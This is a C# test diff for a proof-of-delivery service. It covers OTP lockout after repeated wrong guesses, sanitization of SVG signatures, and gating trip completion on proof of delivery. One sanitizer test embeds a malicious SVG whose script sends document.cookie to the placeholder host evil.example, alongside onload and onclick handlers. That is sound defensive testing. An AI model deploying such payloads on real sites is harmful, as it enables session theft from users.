@@ -336,4 +336,166 @@ public class ProofOfDeliveryTests
         Assert.True(result.Found);
         Assert.False(result.PodRequired);
     }
+
+    // ── OTP brute-force protection: max attempts, then locked ──────────────
+
+    [Fact]
+    public async Task VerifyOtp_FiveWrongGuesses_ThenLockedEvenWithCorrectCode()
+    {
+        var (db, tripId, wpId, _) = await SeedTripWithDeliveryWaypointAsync("otp_lock_" + Guid.NewGuid());
+        var svc = new ProofOfDeliveryService(db);
+        var (_, otp) = await svc.SendOtpAsync(tripId, wpId, "driver-1");
+        var wrong = otp == "000000" ? "111111" : "000000";
+
+        // 5 wrong guesses each increment the counter and are rejected.
+        for (var i = 0; i < 5; i++)
+        {
+            var attempt = await svc.VerifyOtpAsync(tripId, wpId, "driver-1", wrong, 23.0, 72.0);
+            Assert.False(attempt.Ok, $"attempt {i + 1} must be rejected");
+            Assert.True(attempt.OtpAttemptsRemaining == 5 - (i + 1),
+                $"attempt {i + 1}: remaining={attempt.OtpAttemptsRemaining}");
+        }
+
+        // The 6th attempt — even with the CORRECT code — must be locked out.
+        var locked = await svc.VerifyOtpAsync(tripId, wpId, "driver-1", otp, 23.0, 72.0);
+        Assert.False(locked.Ok);
+        Assert.Contains("locked", locked.Error, StringComparison.OrdinalIgnoreCase);
+        Assert.Equal(0, locked.OtpAttemptsRemaining);
+        Assert.False(await svc.HasVerifiedEvidenceAsync(tripId, wpId));
+    }
+
+    [Fact]
+    public async Task VerifyOtp_CorrectCode_AfterWrongGuessesWithinLimit_StillSucceeds()
+    {
+        var (db, tripId, wpId, _) = await SeedTripWithDeliveryWaypointAsync("otp_retry_" + Guid.NewGuid());
+        var svc = new ProofOfDeliveryService(db);
+        var (_, otp) = await svc.SendOtpAsync(tripId, wpId, "driver-1");
+        var wrong = otp == "000000" ? "111111" : "000000";
+
+        // 2 wrong guesses (within the limit) then the correct code verifies.
+        await svc.VerifyOtpAsync(tripId, wpId, "driver-1", wrong, 23.0, 72.0);
+        await svc.VerifyOtpAsync(tripId, wpId, "driver-1", wrong, 23.0, 72.0);
+
+        var ok = await svc.VerifyOtpAsync(tripId, wpId, "driver-1", otp, 23.0, 72.0);
+        Assert.True(ok.Ok);
+        Assert.True(await svc.HasVerifiedEvidenceAsync(tripId, wpId));
+    }
+
+    [Fact]
+    public async Task VerifyOtp_NewlySentOtp_ResetsAttemptCounter()
+    {
+        var (db, tripId, wpId, _) = await SeedTripWithDeliveryWaypointAsync("otp_reset_" + Guid.NewGuid());
+        var svc = new ProofOfDeliveryService(db);
+        var (_, otp) = await svc.SendOtpAsync(tripId, wpId, "driver-1");
+        var wrong = otp == "000000" ? "111111" : "000000";
+
+        // Burn 4 attempts, then re-issue: the fresh code must start at full budget.
+        for (var i = 0; i < 4; i++)
+            await svc.VerifyOtpAsync(tripId, wpId, "driver-1", wrong, 23.0, 72.0);
+
+        var (_, otp2) = await svc.SendOtpAsync(tripId, wpId, "driver-1");
+        var ok = await svc.VerifyOtpAsync(tripId, wpId, "driver-1", otp2, 23.0, 72.0);
+        Assert.True(ok.Ok);
+        Assert.True(await svc.HasVerifiedEvidenceAsync(tripId, wpId));
+    }
+
+    // ── SVG XSS: capture-time sanitization neutralizes script/on* payloads ──
+
+    [Fact]
+    public async Task CaptureSignature_SanitizesMaliciousSvg_StrippingScriptAndEventAttributes()
+    {
+        var (db, tripId, wpId, _) = await SeedTripWithDeliveryWaypointAsync("svg_xss_" + Guid.NewGuid());
+        var svc = new ProofOfDeliveryService(db);
+        var evil = "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 40\" onload=\"alert(1)\">"
+            + "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
+            + "<path d=\"M 10 30 L 30 10\" stroke=\"#000\" stroke-width=\"2\" onclick=\"fetch('/steal')\"/>"
+            + "<foreignObject><div id=\"x\">text</div></foreignObject></svg>";
+
+        var record = await svc.CaptureSignatureAsync(tripId, wpId, "driver-1", evil, 23.0, 72.0);
+
+        var stored = record.SignatureSvg!;
+        Assert.DoesNotContain("script", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("onload", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("onclick", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("foreignObject", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("<div", stored, StringComparison.OrdinalIgnoreCase);
+        // The legitimate drawing surface survives.
+        Assert.Contains("<path", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.Contains("stroke=\"#000\"", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.Contains("viewBox", stored, StringComparison.OrdinalIgnoreCase);
+        Assert.True(await svc.HasVerifiedEvidenceAsync(tripId, wpId));
+    }
+
+    [Fact]
+    public async Task CaptureSignature_KeepsWellFormedSignature_Unchanged()
+    {
+        var (db, tripId, wpId, _) = await SeedTripWithDeliveryWaypointAsync("svg_ok_" + Guid.NewGuid());
+        var svc = new ProofOfDeliveryService(db);
+        var clean = "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 40\"><path d=\"M 5 35 L 25 15 L 45 30\" stroke=\"#000\" stroke-width=\"2\" stroke-linecap=\"round\" fill=\"none\"/></svg>";
+
+        var record = await svc.CaptureSignatureAsync(tripId, wpId, "driver-1", clean, 23.0, 72.0);
+
+        Assert.Equal(clean, record.SignatureSvg);
+    }
+
+    // ── Trip-completion gate: complete blocked until required POD captured ──
+
+    private static async Task<List<string>> CompleteAsync(ApplicationDbContext db, Guid tripId)
+    {
+        var trip = await db.Trips.Include(t => t.TripWaypoints).FirstAsync(t => t.Id == tripId);
+        var lifecycle = new TripLifecycleService(db, new AlwaysEntitledAlertEnforcement());
+        var errors = await lifecycle.TransitionAsync(trip, TripStatus.Completed, null, "manual", "tester");
+        await db.SaveChangesAsync();
+        return errors;
+    }
+
+    [Fact]
+    public async Task CompleteTrip_RequiresPod_BlockedNamingMissingWaypoints()
+    {
+        var (db, tripId, wpId, company) = await SeedTripWithDeliveryWaypointAsync("done_gate_" + Guid.NewGuid());
+        await SetCompanyRequirePodAsync(db, company, true);
+
+        var errors = await CompleteAsync(db, tripId);
+
+        Assert.NotEmpty(errors);
+        Assert.Contains(errors, e => e.Contains("Customer site") && e.Contains("proof of delivery"));
+        var trip = await db.Trips.AsNoTracking().FirstAsync(t => t.Id == tripId);
+        Assert.Equal(TripStatus.InProgress, trip.Status); // transition never applied
+    }
+
+    [Fact]
+    public async Task CompleteTrip_RequiresPod_AfterEvidenceCaptured_Succeeds()
+    {
+        var (db, tripId, wpId, company) = await SeedTripWithDeliveryWaypointAsync("done_ok_" + Guid.NewGuid());
+        await SetCompanyRequirePodAsync(db, company, true);
+        var pod = new ProofOfDeliveryService(db);
+        await pod.CaptureSignatureAsync(tripId, wpId, "driver-1", "<svg>signed</svg>", 23.0, 72.0);
+
+        var errors = await CompleteAsync(db, tripId);
+
+        Assert.Empty(errors);
+        var trip = await db.Trips.AsNoTracking().FirstAsync(t => t.Id == tripId);
+        Assert.Equal(TripStatus.Completed, trip.Status);
+    }
+
+    [Fact]
+    public async Task CompleteTrip_NoPodPolicy_CompletesWithoutEvidence()
+    {
+        var (db, tripId, wpId, _) = await SeedTripWithDeliveryWaypointAsync("done_optional_" + Guid.NewGuid());
+
+        var errors = await CompleteAsync(db, tripId);
+
+        Assert.Empty(errors);
+    }
+
+    [Fact]
+    public async Task CompleteTrip_NonDeliveryTrip_CompletesEvenWhenPolicyRequiresPod()
+    {
+        var (db, tripId, wpId, company) = await SeedTripWithDeliveryWaypointAsync("done_pickup_" + Guid.NewGuid(), type: TripWaypointType.Pickup);
+        await SetCompanyRequirePodAsync(db, company, true);
+
+        var errors = await CompleteAsync(db, tripId);
+
+        Assert.Empty(errors);
+    }
 }
